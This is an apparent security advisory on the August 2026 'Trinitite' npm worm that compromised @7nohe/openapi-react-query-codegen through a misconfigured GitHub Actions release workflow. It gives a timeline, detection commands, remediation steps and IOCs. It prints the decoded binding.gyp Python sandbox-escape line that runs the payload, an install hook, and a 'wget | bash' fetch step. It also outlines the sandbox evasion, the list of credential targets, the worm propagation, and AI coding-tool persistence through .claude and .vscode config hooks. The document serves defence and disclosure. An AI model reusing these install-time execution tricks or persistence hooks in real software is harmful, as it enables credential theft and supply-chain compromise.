# Trinitite npm Worm — @7nohe/openapi-react-query-codegen Compromised via Exposed GitHub Actions Publishing Workflow

**Date:** August 2026
**Ecosystem:** npm
**Severity:** Critical
**Type:** Worm / GitHub Actions Workflow Exploit (Pwn Request) / Credential Stealer
**Sources:**
- [Aikido — Popular code generator for TanStack Query hit by supply chain worm](https://www.aikido.dev/blog/popular-code-generator-for-tanstack-query-hit-by-supply-chain-worm)
- [StepSecurity — @7nohe/openapi-react-query-codegen Compromised Through an Exposed npm Publishing Workflow](https://www.stepsecurity.io/blog/7nohe-openapi-react-query-codegen-compromised-npm-publishing-workflow)

---

## Summary

On August 28, 2026 — one day after Australian and US law enforcement announced arrests of two individuals allegedly behind TeamPCP — GitHub user `p00paboot` exploited an insecure `issue_comment`-triggered release workflow in the `7nohe/openapi-react-query-codegen` repository to publish ten malicious npm versions of `@7nohe/openapi-react-query-codegen` within a 20-minute window. The package, which generates type-safe TanStack Query hooks from OpenAPI schemas, has approximately 150,000 weekly downloads.

The attack did not require a stolen npm token. The repository's release workflow accepted an `npm publish` comment from any pull request participant, checked out that pull request's code, and published via GitHub Actions OIDC (npm Trusted Publishing) — meaning the attacker obtained cryptographically valid provenance attestations simply by exploiting a misconfigured workflow. The malware payload — self-named **"Trinitite: Sponsored by Preview 2 Effects"** — is a credential-stealing worm with multi-ecosystem propagation (npm, PyPI, RubyGems) and AI coding tool persistence implants. Whether this represents a TeamPCP continuation, an ex-member who avoided arrest, or a completely separate copycat actor sharing the same aesthetic remains unconfirmed.

Both stable and prerelease versions were compromised. The eight stable releases grew from ~42 KB (clean) to 4.46–6.53 MB (malicious), carrying a heavily encrypted 5.4 MB JavaScript payload using four distinct encryption layers. The payload downloads Bun v1.x silently to a `trinnyyyy-XXXXX` temp directory, then steals credentials across 150+ file patterns and propagates copies of itself to every package the victim can publish.

---

## Compromised Artifacts

| Package | Malicious Version(s) | Weekly Downloads |
|---------|---------------------|-----------------|
| `@7nohe/openapi-react-query-codegen` | 0.5.4, 0.5.5, 1.6.3, 1.6.4, 2.2.1, 2.2.2, 3.0.3, 3.0.4, 0.0.0-365d4eb738d3146583431948d3ba6e27a32556be, 0.0.0-ec7876d6c917dad516ba69bbfafc948b834bf0ab | ~150,000 |

**Known clean versions:** 0.5.3, 1.6.2, 2.2.0, 3.0.2

---

## How It Worked

### Step 1: Pwn Request via issue_comment Trigger

The repository's release workflow (`release.yml`) listened for `issue_comment` events. It required only that the comment body exactly matched `npm publish` and that it belonged to a pull request. **It did not verify the commenter's repository role, organization membership, or association.** The workflow had `id-token: write` permissions, enabling npm Trusted Publishing.

Attacker `p00paboot` opened pull requests #215 and #216 containing malicious artifacts, then posted the trigger comment. The workflow checked out the PR head — attacker-controlled code — ran `pnpm install`, and published via OIDC. npm's provenance certificates now tie the malicious packages to the official release workflow, making static provenance checks an unreliable trust signal when the workflow itself is compromised.

All stable releases were published between **20:00:43 and 20:20:53 UTC** on August 28, 2026 (a 20-minute window). npm still mapped `latest` to malicious version `3.0.4` at time of initial disclosure.

### Step 2: Installation Hooks — binding.gyp and preinstall

The malicious stable releases use two simultaneous execution vectors:

**binding.gyp Python sandbox escape** (all stable versions). When `npm install` processes `binding.gyp`, it invokes `node-gyp`, which evaluates the `conditions` field using Python. No `preinstall` script entry is needed — Python's `catch_warnings` class is reached by walking the class hierarchy from `()`, providing access to `__builtins__` and `os.system()`. The condition (Unicode-encoded) decodes to:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('node 3FWCvzduYZg.js')
```

The target type is hex-encoded `none` so no actual native compilation occurs.

**Explicit preinstall hook** (versions 3.0.3 and 3.0.4 also carry):
```json
"preinstall": "node 3FWCvzduYZg.js"
```

Earlier prerelease versions used simpler approaches: one ran `node nu.js` directly, another downloaded Bun via `wget | bash` and then ran `is_it_this_simple.js`.

### Step 3: Four-Layer Payload Decryption

`3FWCvzduYZg.js` is a 5.4–6.4 MB single-line file with four encryption layers:

1. **Outer**: 1.6-million-element integer array, XOR'd with key 29
2. **Second**: Decrypts to a script that silently downloads the Bun runtime as `trinnyyyy-XXXXX` in the system temp directory
3. **Third**: AES-128-GCM encrypted real payload (~800 KB)
4. **Inner**: Custom shuffled-table cipher on top of standard obfuscator.io transforms

### Step 4: Sandbox Evasion

Before executing, the payload checks multiple conditions and exits silently if any match:

- System locale is Russian (`Intl.DateTimeFormat`, `LC_ALL`, `LC_MESSAGES`, `LANGUAGE`, `LANG`)
- CrowdStrike, SentinelOne, or CarbonBlack directories are present
- Working directory starts with `/tmp/npm-safe/` or `/opt/hscan-supplychain-dynamic/`
- Environment variables contain known fake credential prefixes: `AKIAFAKE`, `npm_F4k3NPMToken`, `sk-ant-api03-fake`, `ghp_decoyGitHubToken`
- `GITHUB_REPOSITORY_OWNER` is a known security research account (`actions-security-demo`, `h0x0er`, `varunsh-coder`, `rohan-stepsecurity`)
- StepSecurity harden-runner tool is active

### Step 5: Credential Harvesting (150+ Patterns)

- **GitHub tokens**: Classic PATs (`gh[op]_...`), fine-grained tokens (`github_pat_...`), OIDC tokens from Actions runners
- **npm / PyPI / RubyGems**: `~/.npmrc`, bearer tokens validated against `registry.npmjs.org/-/whoami`, `pypi-AgEI...` tokens, `rubygems_...` tokens
- **AWS**: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `~/.aws/credentials`, EC2 IMDS (IMDSv2 first), ECS metadata, `sts:GetCallerIdentity` verification
- **Azure**: Client credentials, IMDS managed identity endpoint, Key Vault, Azure Resource Manager, Microsoft Graph
- **GCP**: Service account JSON, GCP metadata server, Google Secret Manager
- **HashiCorp Vault**: `VAULT_TOKEN`, `VAULT_ADDR`, secret enumeration via API
- **Kubernetes**: Service account tokens, `~/.kube/config`, K3s config
- **Filesystem scan**: `~/.ssh/id_*`, `.env*`, `~/.docker/config.json`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials.toml`, `~/.bash_history`, `~/.zsh_history`, crypto wallets (Ethereum keystore, Monero, Ledger Live, Exodus), messaging sessions (Signal, Telegram, Discord, Slack, Element), VPN configs (NordVPN, OpenVPN, ProtonVPN, CyberGhost, Windscribe, PIA), JFrog Artifactory
- **Claude AI**: `~/.claude.json`, `~/.claude/*`, `~/.claude/projects/*`, `~/.claude/mcp.json`

### Step 6: Exfiltration via Touhou-Named GitHub Repositories

The payload searches GitHub's public commit history for commits whose message matches `"IfYouRevokeThisTokenYourABadUser:{encrypted_token}"`, decrypts the embedded token, and uses that compromised account to create an exfiltration repository. Stolen credentials from one victim are stored in a repo owned by a different compromised user — data sits in plain sight but encrypted with the attacker's RSA public key.

- **Repo names**: Two Touhou Project character names + random number (e.g., `cirno-marisa-74291`, `reimu-kogasa-12048`)
- **Repo description**: `"Trinitite: Sponsored by Preview 2 Effects"` — unique fingerprint
- **File pattern**: `doubletrinnys-{counter}-{timestamp}.json` in `results/`
- **Commit messages**: `"meow meow meow"`

### Step 7: Worm Propagation (npm, PyPI, RubyGems)

With stolen publish tokens the payload spreads to every package the victim can publish. For npm: calls `registry.npmjs.org/-/npm/v1/tokens` to find the highest-privilege publish token, queries `/v1/search?text=maintainer:{user}` to enumerate owned packages, fetches current tarballs, injects a new `binding.gyp` + copy of `3FWCvzduYZg.js`, and publishes a new version. Same pattern for PyPI via `upload.pypi.org/legacy/` and RubyGems via `rubygems.org/api/v1/gems`. All publish requests use `{tls: {rejectUnauthorized: false}}` to bypass certificate pinning.

### Step 8: GitHub Repository Poisoning (AI Tool Persistence)

With stolen GitHub tokens the payload enumerates accessible repositories and branches (skipping `release/`, `dependabot/`, `renovate/`, `copilot/` prefixes) and commits:

- `.vscode/tasks.json` — backdoored task runner
- `.claude/settings.json` — Claude Code `SessionStart` hook executing `setup.mjs` on every project open
- `.claude/setup.mjs` and `.vscode/setup.mjs` — secondary payload
- `.github/workflows/codeql.yml` — fake CodeQL security workflow doubling as a backdoor
- `.gemini/settings.json`, `.cursor/rules/debug.mdc`, `.codex/config.toml`, `.opencode/plugins/setup.js`

Every commit is authored as `github-actions` with message `"chore: update dependencies"` and a `skip-checks:true` trailer to bypass required status checks.

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| Aug 27, 2026 | AFP/FBI/WAPF announce arrests of two individuals alleged to be TeamPCP |
| Aug 28, 2026, 20:00:43 | First malicious version (`0.5.4`) published; package grows from 41,621 to 5,658,449 bytes |
| Aug 28, 2026, 20:20:53 | Last malicious stable release (`3.0.4`) published — 20-minute window |
| Aug 28, 2026 (evening) | Aikido researcher Charlie Eriksen reports issue in GitHub issue #217; Aikido and StepSecurity publish disclosure |
| Aug 29, 2026 | Aikido updates article; npm begins removing malicious versions |

---

## Detection

```bash
# Check if any affected version is installed
npm ls @7nohe/openapi-react-query-codegen 2>/dev/null | \
  grep -E '(0\.5\.4|0\.5\.5|1\.6\.3|1\.6\.4|2\.2\.1|2\.2\.2|3\.0\.3|3\.0\.4|0\.0\.0-365d4|0\.0\.0-ec787)'

# Check for payload file and known artifacts
find . -name "3FWCvzduYZg.js" 2>/dev/null
find . -name "is_it_this_simple.js" 2>/dev/null
find . -name "nu.js" -path "*/openapi-react-query-codegen/*" 2>/dev/null

# Check for Bun runtime dropped in temp dir (signature temp dir name)
find /tmp -maxdepth 2 -name "trinnyyyy-*" -type d 2>/dev/null

# SHA256 verification against known bad hashes (v3.0.4 shown; others listed in IOCs)
sha256sum 3FWCvzduYZg.js 2>/dev/null
# BAD (v3.0.4): b24d121667f21f492cb9db34fbfd515d5922a8dd30b9c45215c7220abbb10ca8

# Detect AI tool backdoors committed by attacker
git log --all --oneline --author="github-actions" | grep "chore: update dependencies"
grep -r "trinnyyyy\|Trinitite\|3FWCvzduYZg\|doubletrinnys" \
  ~/.claude ~/.cursor ~/.gemini .vscode .codex .opencode 2>/dev/null

# Search for Touhou-named exfil repos (requires GitHub CLI and token)
# gh repo list --limit 200 | grep -E '(cirno|marisa|reimu|kogasa|sanae|alice|youmu|sakuya|remilia|flandre)-'
```

---

## Remediation

1. **Stop all builds immediately** on systems that installed an affected version; isolate them
2. From a **separate clean machine**, rotate: npm tokens, GitHub PATs and fine-grained tokens, AWS access keys, Azure client secrets, GCP service account keys, Kubernetes service account tokens, SSH private keys, PyPI/RubyGems publish tokens, Claude AI tokens
3. Invalidate active sessions; review audit logs for unexpected package publishes, new credentials, unusual cloud API calls, or new repository access
4. Remove and discard all affected dependency caches, build artifacts, and lockfiles
5. Pin to known clean versions: `0.5.3`, `1.6.2`, `2.2.0`, or `3.0.2` by exact version in your lockfile
6. Rebuild from a clean environment with reviewed lockfile hashes
7. Inspect all packages you maintain for unexpected versions published Aug 28, 2026 20:00–20:21 UTC
8. Audit all GitHub repos you own for `"chore: update dependencies"` commits authored by `github-actions` adding `.claude/settings.json`, `.vscode/tasks.json`, or `.gemini/settings.json`

---

## Indicators of Compromise

### Malicious package versions
- `@7nohe/openapi-react-query-codegen@0.5.4` (npm tarball SHA1: `2d934cf137a4e62519f88e7ab669d2fabda33867`)
- `@7nohe/openapi-react-query-codegen@0.5.5` (SHA1: `337ae261e4e73a9f365f892dcef2dc6f6932e90a`)
- `@7nohe/openapi-react-query-codegen@1.6.3` (SHA1: `0f9bc76952b67d7a28a57d1e726293f417df0119`)
- `@7nohe/openapi-react-query-codegen@1.6.4` (SHA1: `6499c9ab4e60f9b1db6756cb0de55ebc334a72d1`)
- `@7nohe/openapi-react-query-codegen@2.2.1` (SHA1: `5ab130e4736d4582899af2385ec7eb5a33619d05`)
- `@7nohe/openapi-react-query-codegen@2.2.2` (SHA1: `fc60551b23485829c0a6e910224b049c891a49b8`)
- `@7nohe/openapi-react-query-codegen@3.0.3` (SHA1: `bafa4edaa6812fce10ae703ae450cc88ebbe1730`)
- `@7nohe/openapi-react-query-codegen@3.0.4` (SHA1: `3fc635b988db2bd647b8578dfc1a85769913b708`)
- `@7nohe/openapi-react-query-codegen@0.0.0-365d4eb738d3146583431948d3ba6e27a32556be` (SHA1: `e7a07ca4a3cd51c262495f473abe4c4e505b7be4`)
- `@7nohe/openapi-react-query-codegen@0.0.0-ec7876d6c917dad516ba69bbfafc948b834bf0ab` (SHA1: `206b18c418434abc994bd40e021edcc334eee89b`)

### Files
- `3FWCvzduYZg.js` (SHA256 variants: `8e5d1af68ca340ae0c6e8132cb00c686ec2d60502c1994d94ce353d1472ad5a3`, `b49afb7dba04cd99b357ce7c652c823a3707f28e130bd5c6645851a7adc030d6`, `59370c67b54a0ccaedd265e2356f04540b2fba1e1845300ef6de4d5437d99380`, `778d6f0058045d6a2ab9a7e1d3e3be8e7e6b4d9cc217d13949bf1dfbab759a7c`, `b24d121667f21f492cb9db34fbfd515d5922a8dd30b9c45215c7220abbb10ca8`, `e1f1162ece9a6e6ea21a20399cbf31c563a8149d433a68711f4223870c203d5a`, `b6012b2ff87f08f93ee53921c48db907ddbcf5461b03bb988083b01a36886237`, `709af2fdeb50324229e94c44c679a0fab18bd8e17d3864405989c526cbb63ad8`)
- `is_it_this_simple.js`
- `nu.js`
- `binding.gyp` (malicious)
- `/tmp/trinnyyyy-XXXXXX/bun` (Bun runtime, temp dir with 6 alphanumeric chars)
- `/tmp/*.js`, `/tmp/*/updater.py`

### Behavioral indicators
- GitHub repos with Touhou character name pairs + number (e.g., `cirno-marisa-*`, `reimu-kogasa-*`)
- GitHub repo description: `"Trinitite: Sponsored by Preview 2 Effects"`
- Files in repos: `results/doubletrinnys-*.json`
- Commit messages: `"meow meow meow"`
- Commits authored by `github-actions` with `"chore: update dependencies"` and `skip-checks:true`

---

## Lessons Learned

- **`issue_comment` triggers with `id-token: write` are a critical Pwn Request class.** Any workflow that checks out untrusted PR code and publishes with a privileged OIDC identity is exploitable without any account compromise, regardless of whether the PR is merged.
- **Valid npm provenance attestations do not guarantee package safety.** When the signing workflow itself is compromised, SLSA attestations become an attacker asset rather than a defense.
- **binding.gyp Python sandbox escape bypasses `--ignore-scripts`.** This technique (first documented in Miasma v2) is proliferating. Even `npm install --ignore-scripts` does not prevent `node-gyp` evaluation of `binding.gyp` conditions.
- **Touhou character names as exfil repo fingerprints** provide an unusually distinctive behavioral indicator — a rare case where attacker branding aids defender detection.
- **TeamPCP arrests did not eliminate the threat.** Within 24 hours of the arrests, a similar actor using nearly identical techniques and tooling emerged — underscoring that attack tooling outlives any individual threat actor.
- **AI tool config persistence extends the blast radius beyond CI.** Backdooring `.claude/settings.json`, `.vscode/tasks.json`, and similar files turns every developer who opens a compromised repo into a recurring execution vector long after the malicious npm package is removed.

---

## Related Incidents

- [./2026-08-chaindrop-npm-worm.md](./2026-08-chaindrop-npm-worm.md) — Same Bun-loader and AI tool persistence patterns; EtherHiding C2
- [./2026-06-miasma-v2-binding-gyp.md](./2026-06-miasma-v2-binding-gyp.md) — Original binding.gyp execution bypass technique
- [./2026-07-asyncapi-miasma-v3-cicd.md](./2026-07-asyncapi-miasma-v3-cicd.md) — CI/CD pipeline compromise with valid OIDC provenance attestations
- [./2026-04-prt-scan-github-actions.md](./2026-04-prt-scan-github-actions.md) — pull_request_target exploitation for CI secret theft
